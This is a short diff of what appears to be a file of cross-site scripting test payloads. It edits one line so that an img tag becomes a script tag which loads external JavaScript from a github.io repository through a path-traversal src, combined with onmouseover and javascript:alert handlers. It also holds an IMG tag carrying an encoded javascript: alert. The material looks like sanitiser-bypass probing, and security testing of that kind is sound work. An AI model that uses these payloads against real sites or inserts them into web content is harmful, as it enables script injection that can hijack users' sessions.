@@ -1,6 +1,6 @@
 ![
 %0a
-<a href="<img src=../../../../../../../img/onload/../../\github.com/r89shi/r89shi.github.io/blob/master/teste.js >" alt="\bjavascript:alert(1)" onmouseover="javascript:alert(1)"/>
+<a href="<script src=../../../../../../../img/onload/../../\github.com/r89shi/r89shi.github.io/blob/master/teste.js >" alt="\bjavascript:alert(1)" onmouseover="javascript:alert(1)"/>
 
 <IMG SRC= color=javascript%3aalert(&quot;XSS&quot;) >
   
